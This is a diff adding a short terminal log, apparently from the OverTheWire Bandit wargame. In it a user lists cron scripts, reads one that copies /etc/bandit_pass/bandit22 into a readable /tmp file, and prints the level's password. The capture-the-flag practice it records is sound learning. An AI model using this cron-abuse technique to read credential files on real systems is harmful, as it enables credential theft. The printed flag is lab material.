@@ -1,0 +1,15 @@
+bandit21@bandit:/etc/cron.d$ ls -alh /usr/bin/cronjob_bandit*
+-rwx------ 1 root     root     142 May 14  2020 /usr/bin/cronjob_bandit15_root.sh
+-rwx------ 1 root     root     443 Jul 11  2020 /usr/bin/cronjob_bandit17_root.sh
+-rwxr-x--- 1 bandit22 bandit21 130 May  7  2020 /usr/bin/cronjob_bandit22.sh
+-rwxr-x--- 1 bandit23 bandit22 211 May  7  2020 /usr/bin/cronjob_bandit23.sh
+-rwxr-x--- 1 bandit24 bandit23 376 May 14  2020 /usr/bin/cronjob_bandit24.sh
+-rwx------ 1 root     root     498 May 14  2020 /usr/bin/cronjob_bandit25_root.sh
+-rwx------ 1 root     root     378 May 14  2020 /usr/bin/cronjob_bandit25_root.sh~
+-rwx------ 1 root     root     378 May 14  2020 /usr/bin/cronjob_bandit25_root.sz~
+bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
